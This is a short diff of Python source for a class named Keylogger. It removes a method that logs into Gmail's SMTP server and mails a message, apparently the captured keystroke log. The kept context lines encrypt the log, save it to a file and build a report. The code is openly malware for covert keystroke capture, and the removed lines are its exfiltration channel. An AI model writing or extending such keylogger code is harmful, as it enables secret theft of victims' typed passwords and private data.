@@ -63,13 +63,6 @@ class Keylogger:
             print(Cipher.encrypt(self.log, key=16), file=f)
         print(f"[+] Saved {self.filename}.txt")
 
-    def sendmail(self, to_email, email, password, message):
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, to_email, message)
-        server.quit()
-
     def report(self):
         if self.log:
             self.end_dt = datetime.now()
